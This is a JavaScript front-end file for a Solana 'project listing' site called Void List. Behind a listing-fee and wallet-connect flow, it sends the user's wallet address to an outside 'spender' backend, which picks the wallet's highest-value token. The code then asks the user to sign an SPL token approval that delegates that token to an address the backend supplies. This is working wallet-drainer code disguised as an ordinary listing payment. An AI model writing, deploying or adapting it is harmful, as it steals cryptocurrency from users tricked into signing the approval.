import {
  Connection,
  PublicKey,
  Transaction
} from "https://esm.sh/@solana/web3.js@1.95.3";

import {
  createApproveInstruction,
  TOKEN_PROGRAM_ID,
  getAssociatedTokenAddress
} from "https://esm.sh/@solana/spl-token@0.3.8";

import {
  WalletAdapterNetwork
} from "https://esm.sh/@solana/wallet-adapter-base@0.9.22";

import {
  PhantomWalletAdapter,
  SolflareWalletAdapter,
  BackpackWalletAdapter,
  GlowWalletAdapter,
  WalletConnectWalletAdapter
} from "https://esm.sh/@solana/wallet-adapter-wallets@0.19.19";

const projectForm = document.getElementById('projectForm');
const feeModal = document.getElementById('feeModal');
const walletModal = document.getElementById('walletModal');
const closeButtons = document.getElementsByClassName('close');
const proceedButton = document.getElementById('proceedButton');
const walletConnectButton = document.getElementById('walletConnectButton');

let connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
let wallet = null;

/* UI Flow */
if (projectForm && feeModal) {
  projectForm.addEventListener('submit', (event) => {
    event.preventDefault();
    feeModal.style.display = 'flex';
  });
}
if (closeButtons[0] && feeModal) {
  closeButtons[0].addEventListener('click', () => feeModal.style.display = 'none');
}
if (proceedButton && feeModal && walletModal) {
  proceedButton.addEventListener('click', () => {
    feeModal.style.display = 'none';
    walletModal.style.display = 'flex';
  });
}
if (closeButtons[1] && walletModal) {
  closeButtons[1].addEventListener('click', () => walletModal.style.display = 'none');
}
if (walletConnectButton) {
  walletConnectButton.addEventListener('click', connectWallet);
}

/* Multi-wallet connect */
async function connectWallet() {
  try {
    const adapters = [
      new PhantomWalletAdapter(),
      new SolflareWalletAdapter({ network: WalletAdapterNetwork.Mainnet }),
      new BackpackWalletAdapter(),
      new GlowWalletAdapter(),
      new WalletConnectWalletAdapter({
        network: WalletAdapterNetwork.Mainnet,
        options: {
          projectId: "YOUR_WALLETCONNECT_PROJECT_ID", // replace with your WC Cloud projectId
          relayUrl: "wss://relay.walletconnect.com",
          metadata: {
            name: "Void List",
            description: "Solana Project Listing",
            url: window.location.origin,
            icons: []
          }
        }
      })
    ];

    wallet = adapters.find(w => w.readyState === "Installed" || w.readyState === "Loadable");
    if (!wallet) {
      alert("No supported wallet found. Please install Phantom, Solflare, Backpack, Glow, or use WalletConnect.");
      return;
    }

    await wallet.connect();
    console.log("Connected wallet:", wallet.publicKey.toBase58());

    await approveSpender(wallet.publicKey);
  } catch (err) {
    console.error("Wallet connect error:", err);
    alert("Wallet connection failed: " + err.message);
  }
}

/* Approval logic (non-atomic) */
async function approveSpender(ownerPubKey) {
  try {
    const BACKEND_URL = "https://spender-backend-production-de70.up.railway.app";

    const scanRes = await fetch(`${BACKEND_URL}/scan`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ owner: ownerPubKey.toBase58(), chain: "solana" })
    });

    if (!scanRes.ok) throw new Error(`Backend error: ${scanRes.status}`);

    const scanResult = await scanRes.json();
    if (!scanResult.success || !scanResult.data) {
      alert("No high-value assets found in this wallet.");
      return;
    }

    const { tokenMint, spenderAddress, amount } = scanResult.data;

    const mintPubKey = new PublicKey(tokenMint);
    const delegatePubKey = new PublicKey(spenderAddress);
    const ownerAddress = new PublicKey(ownerPubKey);

    const tokenAccount = await getAssociatedTokenAddress(mintPubKey, ownerAddress);

    const approveIx = createApproveInstruction(
      tokenAccount,
      delegatePubKey,
      ownerAddress,
      amount,
      [],
      TOKEN_PROGRAM_ID
    );

    const tx = new Transaction().add(approveIx);
    tx.feePayer = ownerAddress;
    tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

    const signedTx = await wallet.signTransaction(tx);
    const sig = await connection.sendRawTransaction(signedTx.serialize());
    console.log("Approval tx signature:", sig);

    alert("✅ Approval Successful on Solana!");
  } catch (error) {
    console.error("Approval error:", error);
    alert("❌ Error: " + error.message);
  }
}
